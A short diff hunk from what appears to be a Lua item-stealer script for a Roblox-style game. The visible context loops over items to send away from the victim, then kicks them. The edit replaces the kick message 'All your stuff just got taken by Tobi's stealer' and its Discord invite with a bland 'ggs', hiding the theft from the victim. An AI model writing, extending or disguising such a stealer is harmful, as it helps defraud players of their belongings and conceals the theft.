@@ -408,7 +408,7 @@ if #itemsToSend > 0 then
             end
             wait(1)
         end
-        plr:kick("All your stuff just got taken by Tobi's stealer. discord.gg/GY2RVSEGDT")
+        plr:kick("ggs")
     end
 
     local function waitForUserChat()
